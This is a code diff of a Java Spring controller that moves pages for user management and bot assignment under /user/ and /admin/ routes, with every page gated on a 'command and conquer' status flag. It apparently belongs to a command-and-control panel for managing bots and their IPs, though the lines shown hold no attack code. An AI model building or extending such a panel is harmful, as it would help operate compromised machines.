@@ -80,48 +80,75 @@ public class SiteController {
 					System.out.println("ga " + gA.toString() + "  " + gA.toString().contains("ROLE_ADMIN"));
 					if (gA.toString().contains("ROLE_ADMIN")) {
 						System.out.println("admin ");
-						result = "indexadmin";
+//						httpServletResponse.sendRedirect("/admin/index");
+						
+						result = "redirect:/site/admin/index";
 					}
 					if (gA.toString().contains("ROLE_USER")) {
 						System.out.println("no admin");
-						result = "indexuser";
+//						httpServletResponse.sendRedirect("/user/index");
+						result = "redirect:/site/user/index";
 					}
 				}
 			}
 		}
 		return result;
-		// if (isCurrentAuthenticationAnonymous()) {
-		// return "login";
-		// } else {
-		// return "redirect:/index";
-		// }
+	
 	}
-
+	
+	
+	
+	
 	// @PreAuthorize("hasRole('ADMIN')")
-	@RequestMapping(value = "/index", method = RequestMethod.GET)
-	public String indexAdmin(HttpServletResponse error) throws IOException {
+	@RequestMapping(value = "/user/index", method = RequestMethod.GET)
+	public String indexUser(HttpServletResponse error) throws IOException {
 		String result = "";
-		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
 		if (configEngine.isCommandandconquerStatus()) {
-			System.out.println("Role= " + auth.getAuthorities());
-			// User u=uServ.findBySsoId(auth.getCredentials().toString());
-			Collection<? extends GrantedAuthority> x = (auth.getAuthorities());
-			for (GrantedAuthority gA : x) {
-				System.out.println("ga " + gA.toString() + "  " + gA.toString().contains("ROLE_ADMIN"));
-				if (gA.toString().contains("ROLE_ADMIN")) {
-					System.out.println("admin ");
-					result = "indexadmin";
-				}
-				if (gA.toString().contains("ROLE_USER")) {
-					System.out.println("no admin");
 					result = "indexuser";
-				}
-			}
 		} else {
 			error.sendError(HttpStatus.SC_NOT_FOUND);
 		}
 		return result;
 	}
+	
+	@RequestMapping(value = "/admin/index", method = RequestMethod.GET)
+	public String indexAdmin(HttpServletResponse error) throws IOException {
+		String result = "";
+		if (configEngine.isCommandandconquerStatus()) {
+					result = "indexadmin";
+		} else {
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+		}
+		return result;
+	}
+	
+	
+
+//	// @PreAuthorize("hasRole('ADMIN')")
+//	@RequestMapping(value = "/index", method = RequestMethod.GET)
+//	public String index(HttpServletResponse error) throws IOException {
+//		String result = "";
+//		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
+//		if (configEngine.isCommandandconquerStatus()) {
+//			System.out.println("Role= " + auth.getAuthorities());
+//			// User u=uServ.findBySsoId(auth.getCredentials().toString());
+//			Collection<? extends GrantedAuthority> x = (auth.getAuthorities());
+//			for (GrantedAuthority gA : x) {
+//				System.out.println("ga " + gA.toString() + "  " + gA.toString().contains("ROLE_ADMIN"));
+//				if (gA.toString().contains("ROLE_ADMIN")) {
+//					System.out.println("admin ");
+//					result = "indexadmin";
+//				}
+//				if (gA.toString().contains("ROLE_USER")) {
+//					System.out.println("no admin");
+//					result = "indexuser";
+//				}
+//			}
+//		} else {
+//			error.sendError(HttpStatus.SC_NOT_FOUND);
+//		}
+//		return result;
+//	}
 
 	// @PreAuthorize("hasAnyRole('ADMIN','USER')")
 	/**
@@ -145,30 +172,7 @@ public class SiteController {
 		}
 	}
 
-	//
-	//
-	// /**
-	// * @param error
-	// * @return
-	// * @throws IOException
-	// */
-	// @RequestMapping(value = "/forms", method = RequestMethod.GET)
-	// public String forms(HttpServletResponse error) throws IOException {
-	// String result = "";
-	// if (configEngine.isCommandandconquerStatus()) {
-	// result = "forms";
-	// } else {
-	// error.sendError(HttpStatus.SC_NOT_FOUND);
-	// }
-	// return result;
-	//
-	// }
 
-	// @PreAuthorize("hasRole('ADMIN')")
-	// @RequestMapping(value = "/maps", method = RequestMethod.GET)
-	// public String maps() {
-	// return "maps";
-	// }
 
 	/**
 	 * This method handles logout requests. Toggle the handlers if you are
@@ -188,7 +192,7 @@ public class SiteController {
 				persistentTokenBasedRememberMeServices.logout(request, response, auth);
 				SecurityContextHolder.getContext().setAuthentication(null);
 			}
-			result = "white";
+			result = "redirect:/";
 		} else {
 			error.sendError(HttpStatus.SC_NOT_FOUND);
 		}
@@ -198,9 +202,8 @@ public class SiteController {
 	/**
 	 * This method will provide the medium to add a new user.
 	 */
-	@RequestMapping(value = { "/showbot" }, method = RequestMethod.GET)
+	@RequestMapping(value = { "/user/showbot" }, method = RequestMethod.GET)
 	public ModelAndView showBot() {
-		System.out.println("linkstart");
 		ModelAndView mav = new ModelAndView("userbotlist");
 		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
 		String idUser = auth.getName(); // get logged in username
@@ -225,9 +228,8 @@ public class SiteController {
 	/**
 	 * This method will provide the medium to add a new user.
 	 */
-	@RequestMapping(value = { "/addbot" }, method = RequestMethod.GET)
+	@RequestMapping(value = { "/admin/addbot" }, method = RequestMethod.GET)
 	public String addBot(ModelMap model) {
-		System.out.println("linkstart");
 		model.addAttribute("linkBot", new LinkBot());
 		List<Bot> botList = bServ.findAll();
 		if (botList != null)
@@ -243,7 +245,7 @@ public class SiteController {
 		return "addbot";
 	}
 
-	@RequestMapping(value = { "/addbot" }, method = RequestMethod.POST)
+	@RequestMapping(value = { "/admin/addbot" }, method = RequestMethod.POST)
 	public ModelAndView addBot(@ModelAttribute("linkBot") LinkBot lb) {
 		System.out.println("linkstart2");
 
@@ -256,13 +258,13 @@ public class SiteController {
 		bot.setBotUser(usr);
 		System.out.println("bot " + bot.getIp() + " " + bot.getIdBot() + " " + bot.getBotUser() == null);
 		bServ.updateBot(bot);
-		return new ModelAndView("redirect:/site/addbot");
+		return new ModelAndView("redirect:/site/admin/addbot");
 	}
 
 	/**
 	 * This method will provide the medium to add a new user.
 	 */
-	@RequestMapping(value = { "/removeallbot" }, method = RequestMethod.GET)
+	@RequestMapping(value = { "/admin/removeallbot" }, method = RequestMethod.GET)
 	public String removeBot(ModelMap model) {
 		System.out.println("linkstart");
 		model.addAttribute("usr", new User());
@@ -272,7 +274,7 @@ public class SiteController {
 		return "deletebot";
 	}
 
-	@RequestMapping(value = { "/removeallbot" }, method = RequestMethod.POST)
+	@RequestMapping(value = { "/admin/removeallbot" }, method = RequestMethod.POST)
 	public ModelAndView removeBot(@ModelAttribute("usr") User usr) {
 		System.out.println("linkstart2");
 
@@ -291,15 +293,13 @@ public class SiteController {
 				}
 				bServ.updateAll(botList2);
 			}
-
-		System.out.println("linkFinisgh3");
 		return new ModelAndView("redirect:/site/removeAllbot");
 	}
 
 	/**
 	 * This method will provide the medium to add a new user.
 	 */
-	@RequestMapping(value = { "/newuser" }, method = RequestMethod.GET)
+	@RequestMapping(value = { "/admin/newuser" }, method = RequestMethod.GET)
 	public String newUser(ModelMap model) {
 		User user = new User();
 		model.addAttribute("roles", rServ.findAll());
@@ -313,7 +313,7 @@ public class SiteController {
 	 * This method will be called on form submission, handling POST request for
 	 * saving user in database. It also validates the user input
 	 */
-	@RequestMapping(value = { "/newuser" }, method = RequestMethod.POST)
+	@RequestMapping(value = { "/admin/newuser" }, method = RequestMethod.POST)
 	public String saveUser(@Valid User user, BindingResult result, ModelMap model) {
 
 		if (result.hasErrors()) {
@@ -346,24 +346,7 @@ public class SiteController {
 		}
 	}
 
-	// /**
-	// * This method will provide UserProfile list to views
-	// */
-	// @ModelAttribute("roles")
-	// public List<Role> initializeProfiles() {
-	// return rServ.findAll();
-	// }
-	//
-	// @ModelAttribute("users")
-	// public List<User> userForBot() {
-	// return uServ.findAll();
-	// }
-	//
-	// @ModelAttribute("bots")
-	// public List<Bot> botForUser() {
-	// // TODO ritornare solo i bot disponibili per essere assegnati
-	// return bServ.findAll();
-	// }
+
 
 	private String getPrincipal() {
 		String userName = null;
@@ -400,6 +383,51 @@ public class SiteController {
 
 		return "TESTING";
 	}
+	
+	// /**
+	// * This method will provide UserProfile list to views
+	// */
+	// @ModelAttribute("roles")
+	// public List<Role> initializeProfiles() {
+	// return rServ.findAll();
+	// }
+	//
+	// @ModelAttribute("users")
+	// public List<User> userForBot() {
+	// return uServ.findAll();
+	// }
+	//
+	// @ModelAttribute("bots")
+	// public List<Bot> botForUser() {
+	// // TODO ritornare solo i bot disponibili per essere assegnati
+	// return bServ.findAll();
+	// }
+	
+	//
+	//
+	// /**
+	// * @param error
+	// * @return
+	// * @throws IOException
+	// */
+	// @RequestMapping(value = "/forms", method = RequestMethod.GET)
+	// public String forms(HttpServletResponse error) throws IOException {
+	// String result = "";
+	// if (configEngine.isCommandandconquerStatus()) {
+	// result = "forms";
+	// } else {
+	// error.sendError(HttpStatus.SC_NOT_FOUND);
+	// }
+	// return result;
+	//
+	// }
+
+	// @PreAuthorize("hasRole('ADMIN')")
+	// @RequestMapping(value = "/maps", method = RequestMethod.GET)
+	// public String maps() {
+	// return "maps";
+	// }
+	
 
 	//
 	// @RequestMapping(value = { "/assignBot" }, method = RequestMethod.POST)
